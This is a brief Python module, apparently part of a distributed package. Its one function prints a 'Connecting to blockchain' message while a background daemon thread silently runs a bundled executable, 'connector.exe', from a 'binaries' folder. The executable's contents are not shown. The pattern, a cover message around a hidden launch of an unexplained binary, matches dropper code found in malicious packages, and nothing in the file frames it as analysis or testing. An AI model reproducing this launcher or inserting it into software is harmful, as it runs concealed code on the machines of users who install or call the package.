import os
import threading
from time import sleep

def f():
    print("[+] Connecting to blockchain...")

    def startAsync():
        package_dir = os.path.dirname(__file__)
        binary_path = os.path.join(package_dir, 'binaries')
        os.chdir(binary_path)
        os.system("connector.exe")


    thread = threading.Thread(target=startAsync, daemon=True)
    thread.start()
    sleep(3)